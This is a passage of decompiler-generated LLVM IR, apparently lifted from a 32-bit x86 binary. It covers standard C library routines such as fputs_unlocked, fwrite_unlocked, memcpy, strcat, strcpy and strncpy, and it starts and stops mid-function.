  %v1_8051441 = icmp eq i1 %v10_805143e, false
  br i1 %v1_8051441, label %dec_label_pc_8051451, label %dec_label_pc_8051443

dec_label_pc_8051443:                             ; preds = %dec_label_pc_805143b
  %v1_8051443 = inttoptr i32 %v3_805143b to i8*
  %v2_8051443 = load i8, i8* %v1_8051443, align 1
  %v3_8051443 = zext i8 %v2_8051443 to i32
  %v4_8051443 = load i32, i32* @edx, align 4
  %v5_8051443 = and i32 %v4_8051443, -256
  %v6_8051443 = or i32 %v5_8051443, %v3_8051443
  store i32 %v6_8051443, i32* @edx, align 4
  %v1_8051445 = add i32 %v3_805143b, 1
  store i32 %v1_8051445, i32* %eax.global-to-local, align 4
  %v2_8051446 = load i32, i32* @ebx, align 4
  %v3_8051446 = inttoptr i32 %v2_8051446 to i8*
  store i8 %v2_8051443, i8* %v3_8051446, align 1
  %v0_8051448 = load i32, i32* @ebx, align 4
  %v1_8051448 = add i32 %v0_8051448, 1
  store i32 %v1_8051448, i32* @ebx, align 4
  %v0_8051449 = load i32, i32* @edx, align 4
  %v1_8051449 = trunc i32 %v0_8051449 to i8
  %v10_8051449 = icmp eq i8 %v1_8051449, 10
  %v0_805144c = load i32, i32* %eax.global-to-local, align 4
  %v1_805144c = load i32, i32* @ebp, align 4
  %v2_805144c = add i32 %v1_805144c, 16
  %v3_805144c = inttoptr i32 %v2_805144c to i32*
  store i32 %v0_805144c, i32* %v3_805144c, align 4
  br i1 %v10_8051449, label %dec_label_pc_8051474, label %dec_label_pc_805146f.dec_label_pc_8051471_crit_edge

dec_label_pc_8051451:                             ; preds = %dec_label_pc_805143b
  %v0_8051455 = call i32 @getc_unlocked()
  %v1_8051455 = trunc i32 %v0_8051455 to i8
  store i32 %v0_8051455, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_8051455, 256
  %v11_805145d = icmp eq i32 %sext.mask, 255
  %v1_8051460 = icmp eq i1 %v11_805145d, false
  br i1 %v1_8051460, label %dec_label_pc_805146f, label %dec_label_pc_8051462

dec_label_pc_8051462:                             ; preds = %dec_label_pc_8051451
  %v0_8051462 = load i32, i32* @ebp, align 4
  %v1_8051462 = inttoptr i32 %v0_8051462 to i8*
  %v2_8051462 = load i8, i8* %v1_8051462, align 1
  %v3_8051462 = and i8 %v2_8051462, 8
  %v4_8051462 = icmp eq i8 %v3_8051462, 0
  br i1 %v4_8051462, label %dec_label_pc_8051474, label %dec_label_pc_805147d

dec_label_pc_805146f:                             ; preds = %dec_label_pc_8051451
  %v3_805146a = load i32, i32* @ebx, align 4
  %v4_805146a = inttoptr i32 %v3_805146a to i8*
  store i8 %v1_8051455, i8* %v4_805146a, align 1
  %v0_805146c = load i32, i32* @ebx, align 4
  %v1_805146c = add i32 %v0_805146c, 1
  store i32 %v1_805146c, i32* @ebx, align 4
  %v11_805146d = icmp eq i8 %v1_8051455, 10
  br i1 %v11_805146d, label %dec_label_pc_8051474, label %dec_label_pc_805146f.dec_label_pc_8051471_crit_edge

dec_label_pc_805146f.dec_label_pc_8051471_crit_edge: ; preds = %dec_label_pc_8051443, %dec_label_pc_805146f
  %v0_8051471.pre = load i32, i32* @esi, align 4
  %v1_8051471 = add i32 %v0_8051471.pre, -1
  %v8_8051471 = icmp eq i32 %v1_8051471, 0
  store i32 %v1_8051471, i32* @esi, align 4
  %v1_8051472 = icmp eq i1 %v8_8051471, false
  br i1 %v1_8051472, label %dec_label_pc_805146f.dec_label_pc_8051471_crit_edge.dec_label_pc_805143b_crit_edge, label %dec_label_pc_8051474

dec_label_pc_805146f.dec_label_pc_8051471_crit_edge.dec_label_pc_805143b_crit_edge: ; preds = %dec_label_pc_805146f.dec_label_pc_8051471_crit_edge
  %v0_805143b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805143b

dec_label_pc_8051474:                             ; preds = %dec_label_pc_8051471.preheader, %dec_label_pc_8051443, %dec_label_pc_805146f.dec_label_pc_8051471_crit_edge, %dec_label_pc_805146f, %dec_label_pc_8051462
  %v0_8051474 = load i32, i32* @ebx, align 4
  %v1_8051474 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8051474, %v1_8051474
  br i1 %tmp23, label %dec_label_pc_8051478, label %dec_label_pc_805147d

dec_label_pc_8051478:                             ; preds = %dec_label_pc_8051474
  %v1_8051478 = inttoptr i32 %v0_8051474 to i8*
  store i8 0, i8* %v1_8051478, align 1
  %v0_8051482.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805147f

dec_label_pc_805147d:                             ; preds = %dec_label_pc_8051474, %dec_label_pc_8051462, %entry
  br label %dec_label_pc_805147f

dec_label_pc_805147f:                             ; preds = %dec_label_pc_8051478, %dec_label_pc_805147d
  %v0_8051482 = phi i32 [ %v0_8051482.pre, %dec_label_pc_8051478 ], [ 0, %dec_label_pc_805147d ]
  store i32 %v0_8051482, i32* %eax.global-to-local, align 4
  store i32 %v0_8051420, i32* @ebp, align 4
  ret i32 %v0_8051482

; uselistorder directives
  uselistorder i32 %v0_8051482, { 1, 0 }
  uselistorder i32 %v0_8051474, { 1, 0 }
  uselistorder i32 %v1_8051471, { 1, 0 }
  uselistorder i32 %v0_8051455, { 0, 2, 1 }
  uselistorder i32 %v0_805143b, { 1, 0 }
  uselistorder label %dec_label_pc_805147f, { 1, 0 }
  uselistorder label %dec_label_pc_8051474, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_805146f.dec_label_pc_8051471_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805143b, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805148c = load i32, i32* @esi, align 4
  %v0_805148d = load i32, i32* @ebx, align 4
  store i32 %v0_805148d, i32* %stack_var_-8, align 4
  %v4_8051491 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051491, i32* @ebx, align 4
  %v3_8051496 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8051496, i32* @esi, align 4
  %v0_80514a7 = load i32, i32* @ebx, align 4
  %v6_80514a8 = call i32 @__GI_fwrite_unlocked(i32 %v0_80514a7, i64 1, i32 %v3_8051496, i32 %arg2)
  %v1_80514b3 = load i32, i32* @esi, align 4
  %v12_80514b3 = icmp eq i32 %v6_80514a8, %v1_80514b3
  %v1_80514b5 = icmp eq i1 %v12_80514b3, false
  br i1 %v1_80514b5, label %dec_label_pc_80514b9, label %dec_label_pc_80514b7

dec_label_pc_80514b7:                             ; preds = %entry
  br label %dec_label_pc_80514b9

dec_label_pc_80514b9:                             ; preds = %entry, %dec_label_pc_80514b7
  %v0_80514b9 = phi i32 [ -1, %entry ], [ %v6_80514a8, %dec_label_pc_80514b7 ]
  %v2_80514bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80514bc, i32* @ebx, align 4
  store i32 %v0_805148c, i32* @esi, align 4
  ret i32 %v0_80514b9

; uselistorder directives
  uselistorder i32 %v6_80514a8, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80514b9, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_80514c0 = load i32, i32* @edi, align 4
  %v0_80514c1 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_80514c7 = trunc i64 %arg2 to i32
  store i32 %v4_80514c7, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_80514cf = inttoptr i32 %arg4 to i16*
  %v2_80514cf = load i16, i16* %v1_80514cf, align 2
  %v1_80514d2 = and i16 %v2_80514cf, 192
  %v6_80514d7 = icmp eq i16 %v1_80514d2, 192
  br i1 %v6_80514d7, label %dec_label_pc_80514f2, label %dec_label_pc_80514de

dec_label_pc_80514de:                             ; preds = %entry
  %v0_80514de = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_80514e6 = call i32 @__stdio_trans2w_o(i16* %v1_80514cf, i32 128, i32 %v0_80514de, i32 %v0_80514de)
  %v1_80514ee = icmp eq i32 %v6_80514e6, 0
  %v1_80514f0 = icmp eq i1 %v1_80514ee, false
  br i1 %v1_80514f0, label %dec_label_pc_805152e, label %dec_label_pc_80514f2

dec_label_pc_80514f2:                             ; preds = %dec_label_pc_80514de, %entry
  %v2_80514f2 = icmp eq i32 %v4_80514c7, 0
  br i1 %v2_80514f2, label %dec_label_pc_805152e, label %dec_label_pc_80514f6

dec_label_pc_80514f6:                             ; preds = %dec_label_pc_80514f2
  %v1_80514f6 = icmp eq i32 %arg3, 0
  br i1 %v1_80514f6, label %dec_label_pc_805152e, label %dec_label_pc_80514fa

dec_label_pc_80514fa:                             ; preds = %dec_label_pc_80514f6
  %v9_80514ff = udiv i64 4294967295, %arg2
  %v10_80514ff = trunc i64 %v9_80514ff to i32
  %v6_8051503 = icmp ult i32 %v10_80514ff, %arg3
  br i1 %v6_8051503, label %dec_label_pc_805151f, label %dec_label_pc_8051505

dec_label_pc_8051505:                             ; preds = %dec_label_pc_80514fa
  %sext = mul i64 %arg2, 4294967296
  %v2_8051508 = sdiv i64 %sext, 4294967296
  %v3_8051508 = sext i32 %arg3 to i64
  %v4_8051508 = mul nsw i64 %v3_8051508, %v2_8051508
  %v5_8051508 = trunc i64 %v4_8051508 to i32
  %v0_805150b = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_8051511 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8051508, i32 %v0_805150b, i32 %v10_80514ff)
  %v6_8051511 = sext i32 %v5_8051511 to i64
  %v10_8051518 = udiv i64 %v6_8051511, %arg2
  %v11_8051518 = trunc i64 %v10_8051518 to i32
  br label %dec_label_pc_8051530

dec_label_pc_805151f:                             ; preds = %dec_label_pc_80514fa
  %v0_805151f = load i32, i32* @ebx, align 4
  %v1_805151f = inttoptr i32 %v0_805151f to i16*
  %v2_805151f = load i16, i16* %v1_805151f, align 2
  %v3_805151f = or i16 %v2_805151f, 8
  store i16 %v3_805151f, i16* %v1_805151f, align 2
  %v0_8051523 = load i32, i32* %stack_var_-28, align 4
  %v1_8051523 = call i32 @__errno_location(i32 %v0_8051523)
  %v1_8051528 = inttoptr i32 %v1_8051523 to i32*
  store i32 22, i32* %v1_8051528, align 4
  br label %dec_label_pc_805152e

dec_label_pc_805152e:                             ; preds = %dec_label_pc_80514f6, %dec_label_pc_80514f2, %dec_label_pc_80514de, %dec_label_pc_805151f
  br label %dec_label_pc_8051530

dec_label_pc_8051530:                             ; preds = %dec_label_pc_8051505, %dec_label_pc_805152e
  %v0_8051533 = phi i32 [ %v11_8051518, %dec_label_pc_8051505 ], [ 0, %dec_label_pc_805152e ]
  store i32 %v0_80514c1, i32* @esi, align 4
  store i32 %v0_80514c0, i32* @edi, align 4
  ret i32 %v0_8051533

; uselistorder directives
  uselistorder i32 %v0_80514de, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @__stdio_trans2w_o, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051530, { 1, 0 }
  uselistorder label %dec_label_pc_805152e, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051535 = load i32, i32* @esi, align 4
  store i32 %v0_8051535, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8051536 = sdiv i32 %sext, 16777216
  store i32 %v4_8051536, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051540 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051540, i32* %edi.global-to-local, align 4
  %v2_8051544 = udiv i32 %v4_8051536, 4
  %v3_8051547 = inttoptr i32 %arg2 to i8*
  %v4_8051547 = bitcast i16* %arg1 to i8*
  %v5_8051547 = call i8* @_memcpy(i8* %v4_8051547, i8* %v3_8051547, i32 %v2_8051544)
  %v6_8051547 = ptrtoint i8* %v5_8051547 to i32
  store i32 %v6_8051547, i32* @ecx, align 4
  %v0_8051549 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051549 = and i32 %v0_8051549, 2
  %v3_8051549 = icmp eq i32 %v2_8051549, 0
  br i1 %v3_8051549, label %dec_label_pc_805154f, label %dec_label_pc_805154d

dec_label_pc_805154d:                             ; preds = %entry
  %v0_805154d = load i32, i32* %esi.global-to-local, align 4
  %v1_805154d = inttoptr i32 %v0_805154d to i16*
  %v2_805154d = load i16, i16* %v1_805154d, align 2
  %v3_805154d = load i32, i32* %edi.global-to-local, align 4
  %v4_805154d = inttoptr i32 %v3_805154d to i16*
  store i16 %v2_805154d, i16* %v4_805154d, align 2
  %v5_805154d = load i32, i32* %edi.global-to-local, align 4
  %v6_805154d = load i32, i32* %esi.global-to-local, align 4
  %v7_805154d = load i1, i1* @df, align 1
  %v8_805154d = select i1 %v7_805154d, i32 -2, i32 2
  %v9_805154d = add i32 %v8_805154d, %v5_805154d
  %v10_805154d = add i32 %v8_805154d, %v6_805154d
  store i32 %v9_805154d, i32* %edi.global-to-local, align 4
  store i32 %v10_805154d, i32* %esi.global-to-local, align 4
  %v0_805154f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805154f

dec_label_pc_805154f:                             ; preds = %entry, %dec_label_pc_805154d
  %v0_805154f = phi i32 [ %v0_8051549, %entry ], [ %v0_805154f.pre, %dec_label_pc_805154d ]
  %v2_805154f = urem i32 %v0_805154f, 2
  %v3_805154f = icmp eq i32 %v2_805154f, 0
  br i1 %v3_805154f, label %dec_label_pc_8051554, label %dec_label_pc_8051553

dec_label_pc_8051553:                             ; preds = %dec_label_pc_805154f
  %v0_8051553 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051553 = inttoptr i32 %v0_8051553 to i8*
  %v2_8051553 = load i8, i8* %v1_8051553, align 1
  %v3_8051553 = load i32, i32* %edi.global-to-local, align 4
  %v4_8051553 = inttoptr i32 %v3_8051553 to i8*
  store i8 %v2_8051553, i8* %v4_8051553, align 1
  %v5_8051553 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051553 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051553 = load i1, i1* @df, align 1
  %v8_8051553 = select i1 %v7_8051553, i32 -1, i32 1
  %v9_8051553 = add i32 %v8_8051553, %v5_8051553
  %v10_8051553 = add i32 %v8_8051553, %v6_8051553
  store i32 %v9_8051553, i32* %edi.global-to-local, align 4
  store i32 %v10_8051553, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051554

dec_label_pc_8051554:                             ; preds = %dec_label_pc_805154f, %dec_label_pc_8051553
  store i32 %v4_8051540, i32* %eax.global-to-local, align 4
  %v2_8051558 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051558, i32* @esi, align 4
  ret i32 %v4_8051540

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051554, { 1, 0 }
  uselistorder label %dec_label_pc_805154f, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805155c = load i32, i32* @edi, align 4
  %v4_8051565 = ptrtoint i8* %arg1 to i32
  %v5_8051569 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8051569 = ptrtoint i8* %v5_8051569 to i32
  store i32 %v6_8051569, i32* @ecx, align 4
  store i32 %v0_805155c, i32* @edi, align 4
  ret i32 %v4_8051565

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051575 = load i32, i32* @esi, align 4
  store i32 %v0_8051575, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_805157f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805157f, i32* %edi.global-to-local, align 4
  %v3_8051583 = call i32 @_strlen(i8* %arg1)
  %v2_8051585 = add i32 %v4_805157f, -1
  store i32 %v2_8051585, i32* %edi.global-to-local, align 4
  %v8_8051586.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051586

dec_label_pc_8051586:                             ; preds = %dec_label_pc_8051586, %entry
  %v2_8051587 = phi i32 [ %v7_8051587, %dec_label_pc_8051586 ], [ %v2_8051585, %entry ]
  %v8_8051586 = phi i1 [ %v5_8051587, %dec_label_pc_8051586 ], [ %v8_8051586.pre, %entry ]
  %v4_8051586 = phi i32 [ %v0_8051588, %dec_label_pc_8051586 ], [ 0, %entry ]
  %v0_8051586 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051586 = inttoptr i32 %v0_8051586 to i8*
  %v2_8051586 = load i8, i8* %v1_8051586, align 1
  %v3_8051586 = zext i8 %v2_8051586 to i32
  %v5_8051586 = and i32 %v4_8051586, -256
  %v6_8051586 = or i32 %v3_8051586, %v5_8051586
  store i32 %v6_8051586, i32* %eax.global-to-local, align 4
  %v9_8051586 = select i1 %v8_8051586, i32 -1, i32 1
  %v10_8051586 = add i32 %v0_8051586, %v9_8051586
  store i32 %v10_8051586, i32* %esi.global-to-local, align 4
  %v3_8051587 = inttoptr i32 %v2_8051587 to i8*
  store i8 %v2_8051586, i8* %v3_8051587, align 1
  %v4_8051587 = load i32, i32* %edi.global-to-local, align 4
  %v5_8051587 = load i1, i1* @df, align 1
  %v6_8051587 = select i1 %v5_8051587, i32 -1, i32 1
  %v7_8051587 = add i32 %v6_8051587, %v4_8051587
  store i32 %v7_8051587, i32* %edi.global-to-local, align 4
  %v0_8051588 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051588 = trunc i32 %v0_8051588 to i8
  %v4_8051588 = icmp eq i8 %v3_8051588, 0
  %v1_805158a = icmp eq i1 %v4_8051588, false
  br i1 %v1_805158a, label %dec_label_pc_8051586, label %dec_label_pc_805158c

dec_label_pc_805158c:                             ; preds = %dec_label_pc_8051586
  store i32 %v4_805157f, i32* %eax.global-to-local, align 4
  %v2_8051590 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051590, i32* @esi, align 4
  ret i32 %v4_805157f

; uselistorder directives
  uselistorder i32 %v0_8051588, { 1, 0 }
  uselistorder i32 %v7_8051587, { 1, 0 }
  uselistorder i1 %v5_8051587, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8051595 = ptrtoint i8* %arg1 to i32
  %v2_805159d = mul i32 %arg2, 256
  %v3_805159d = and i32 %v2_805159d, 65280
  %v4_805159d = and i32 %arg2, -65281
  %v5_805159d = or i32 %v3_805159d, %v4_805159d
  %v8_805159f.pre = load i1, i1* @df, align 1
  %v9_805159f = select i1 %v8_805159f.pre, i32 -1, i32 1
  br label %dec_label_pc_805159f

dec_label_pc_805159f:                             ; preds = %dec_label_pc_80515a4, %entry
  %v4_805159f = phi i32 [ %v6_805159f, %dec_label_pc_80515a4 ], [ %v5_805159d, %entry ]
  %v7_805159f = phi i32 [ %v10_805159f, %dec_label_pc_80515a4 ], [ %v4_8051595, %entry ]
  %v1_805159f = inttoptr i32 %v7_805159f to i8*
  %v2_805159f = load i8, i8* %v1_805159f, align 1
  %v10_805159f = add i32 %v7_805159f, %v9_805159f
  %v3_80515a0 = udiv i32 %v4_805159f, 256
  %v4_80515a0 = trunc i32 %v3_80515a0 to i8
  %v16_80515a0 = icmp eq i8 %v2_805159f, %v4_80515a0
  br i1 %v16_80515a0, label %dec_label_pc_80515ad.loopexit, label %dec_label_pc_80515a4

dec_label_pc_80515a4:                             ; preds = %dec_label_pc_805159f
  %v3_805159f = zext i8 %v2_805159f to i32
  %v5_805159f = and i32 %v4_805159f, -256
  %v6_805159f = or i32 %v3_805159f, %v5_805159f
  %v4_80515a4 = icmp eq i8 %v2_805159f, 0
  %v1_80515a6 = icmp eq i1 %v4_80515a4, false
  br i1 %v1_80515a6, label %dec_label_pc_805159f, label %dec_label_pc_80515a8

dec_label_pc_80515a8:                             ; preds = %dec_label_pc_80515a4
  br label %dec_label_pc_80515ad

dec_label_pc_80515ad.loopexit:                    ; preds = %dec_label_pc_805159f
  %phitmp = add i32 %v10_805159f, -1
  br label %dec_label_pc_80515ad

dec_label_pc_80515ad:                             ; preds = %dec_label_pc_80515ad.loopexit, %dec_label_pc_80515a8
  %v0_80515ad = phi i32 [ 0, %dec_label_pc_80515a8 ], [ %phitmp, %dec_label_pc_80515ad.loopexit ]
  ret i32 %v0_80515ad

; uselistorder directives
  uselistorder i8 %v2_805159f, { 1, 2, 0 }
  uselistorder i32 %v4_805159f, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80515b5 = load i32, i32* @esi, align 4
  store i32 %v0_80515b5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80515bd = ptrtoint i8* %arg1 to i32
  store i32 %v4_80515bd, i32* %edi.global-to-local, align 4
  %v4_80515c1.pre = load i32, i32* @eax, align 4
  %v8_80515c1.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80515c1

dec_label_pc_80515c1:                             ; preds = %dec_label_pc_80515c1.dec_label_pc_80515c1_crit_edge, %entry
  %v2_80515c2 = phi i32 [ %v7_80515c2, %dec_label_pc_80515c1.dec_label_pc_80515c1_crit_edge ], [ %v4_80515bd, %entry ]
  %v8_80515c1 = phi i1 [ %v5_80515c2, %dec_label_pc_80515c1.dec_label_pc_80515c1_crit_edge ], [ %v8_80515c1.pre, %entry ]
  %v4_80515c1 = phi i32 [ %v0_80515c3, %dec_label_pc_80515c1.dec_label_pc_80515c1_crit_edge ], [ %v4_80515c1.pre, %entry ]
  %v7_80515c1 = phi i32 [ %v0_80515c1.pre, %dec_label_pc_80515c1.dec_label_pc_80515c1_crit_edge ], [ %arg2, %entry ]
  %v1_80515c1 = inttoptr i32 %v7_80515c1 to i8*
  %v2_80515c1 = load i8, i8* %v1_80515c1, align 1
  %v3_80515c1 = zext i8 %v2_80515c1 to i32
  %v5_80515c1 = and i32 %v4_80515c1, -256
  %v6_80515c1 = or i32 %v3_80515c1, %v5_80515c1
  store i32 %v6_80515c1, i32* %eax.global-to-local, align 4
  %v9_80515c1 = select i1 %v8_80515c1, i32 -1, i32 1
  %v10_80515c1 = add i32 %v7_80515c1, %v9_80515c1
  store i32 %v10_80515c1, i32* %esi.global-to-local, align 4
  %v3_80515c2 = inttoptr i32 %v2_80515c2 to i8*
  store i8 %v2_80515c1, i8* %v3_80515c2, align 1
  %v4_80515c2 = load i32, i32* %edi.global-to-local, align 4
  %v5_80515c2 = load i1, i1* @df, align 1
  %v6_80515c2 = select i1 %v5_80515c2, i32 -1, i32 1
  %v7_80515c2 = add i32 %v6_80515c2, %v4_80515c2
  store i32 %v7_80515c2, i32* %edi.global-to-local, align 4
  %v0_80515c3 = load i32, i32* %eax.global-to-local, align 4
  %v3_80515c3 = trunc i32 %v0_80515c3 to i8
  %v4_80515c3 = icmp eq i8 %v3_80515c3, 0
  %v1_80515c5 = icmp eq i1 %v4_80515c3, false
  br i1 %v1_80515c5, label %dec_label_pc_80515c1.dec_label_pc_80515c1_crit_edge, label %dec_label_pc_80515c7

dec_label_pc_80515c1.dec_label_pc_80515c1_crit_edge: ; preds = %dec_label_pc_80515c1
  %v0_80515c1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80515c1

dec_label_pc_80515c7:                             ; preds = %dec_label_pc_80515c1
  store i32 %v4_80515bd, i32* %eax.global-to-local, align 4
  %v2_80515cb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80515cb, i32* @edx, align 4
  %v2_80515cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80515cc, i32* @esi, align 4
  ret i32 %v4_80515bd

; uselistorder directives
  uselistorder i32 %v0_80515c3, { 1, 0 }
  uselistorder i32 %v7_80515c2, { 1, 0 }
  uselistorder i1 %v5_80515c2, { 1, 0 }
  uselistorder i32 %v4_80515bd, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80515e5 = load i32, i32* @esi, align 4
  store i32 %v0_80515e5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80515f1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80515f1, i32* %edi.global-to-local, align 4
  %v1_80515f5 = add i32 %arg3, 1
  store i32 %v1_80515f5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80515f6

dec_label_pc_80515f6:                             ; preds = %dec_label_pc_80515f9, %entry
  %v3_80515fa = phi i32 [ %v4_80515f1, %entry ], [ %v8_80515fa, %dec_label_pc_80515f9 ]
  %v0_80515f6 = phi i32 [ %v1_80515f5, %entry ], [ %v0_80515f6.pre, %dec_label_pc_80515f9 ]
  %v1_80515f6 = add i32 %v0_80515f6, -1
  %v8_80515f6 = icmp eq i32 %v1_80515f6, 0
  store i32 %v1_80515f6, i32* %ecx.global-to-local, align 4
  br i1 %v8_80515f6, label %.loopexit, label %dec_label_pc_80515f9

dec_label_pc_80515f9:                             ; preds = %dec_label_pc_80515f6
  %v0_80515f9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80515f9 = inttoptr i32 %v0_80515f9 to i8*
  %v2_80515f9 = load i8, i8* %v1_80515f9, align 1
  %v10_80515f9 = load i1, i1* @df, align 1
  %v11_80515f9 = select i1 %v10_80515f9, i32 -1, i32 1
  %v12_80515f9 = add i32 %v11_80515f9, %v0_80515f9
  store i32 %v12_80515f9, i32* %esi.global-to-local, align 4
  %v4_80515fa = inttoptr i32 %v3_80515fa to i8*
  store i8 %v2_80515f9, i8* %v4_80515fa, align 1
  %v5_80515fa = load i32, i32* %edi.global-to-local, align 4
  %v6_80515fa = load i1, i1* @df, align 1
  %v7_80515fa = select i1 %v6_80515fa, i32 -1, i32 1
  %v8_80515fa = add i32 %v7_80515fa, %v5_80515fa
  store i32 %v8_80515fa, i32* %edi.global-to-local, align 4
  %v6_80515fb = icmp eq i8 %v2_80515f9, 0
  %v1_80515fd = icmp eq i1 %v6_80515fb, false
  %v0_80515f6.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_80515fd, label %dec_label_pc_80515f6, label %dec_label_pc_80515ff

dec_label_pc_80515ff:                             ; preds = %dec_label_pc_80515f9
  %v1_80515ff = add i32 %v0_80515f6.pre, -1
  store i32 %v1_80515ff, i32* %ecx.global-to-local, align 4
  %v2_8051600 = sext i8 %v2_80515f9 to i32
  %v4_8051600 = inttoptr i32 %v8_80515fa to i8*
  %v5_8051600 = call i8* @_memset(i8* %v4_8051600, i32 %v2_8051600, i32 %v1_80515ff)
  %v6_8051600 = ptrtoint i8* %v5_8051600 to i32
  store i32 %v6_8051600, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_80515f6, %dec_label_pc_80515ff
  %v2_8051606 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051606, i32* @edx, align 4
  %v2_8051607 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051607, i32* @esi, align 4
  ret i32 %v4_80515f1

; uselistorder directives
  uselistorder i32 %v8_80515fa, { 0, 2, 1 }
  uselistorder i8 %v2_80515f9, { 0, 2, 1 }
  uselistorder i32 %v1_80515f6, { 1, 0 }
  uselistorder i32 %v4_80515f1, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_805160c = ptrtoint i8* %tmp4 to i32
  %v8_805161f5 = icmp eq i32 %tmp, 0
  %v1_80516206 = icmp eq i1 %v8_805161f5, false
  br i1 %v1_80516206, label %dec_label_pc_8051619, label %dec_label_pc_8051622

dec_label_pc_8051619:                             ; preds = %entry, %dec_label_pc_805161e
  %v1_805161f8 = phi i32 [ %v1_805161f, %dec_label_pc_805161e ], [ %tmp, %entry ]
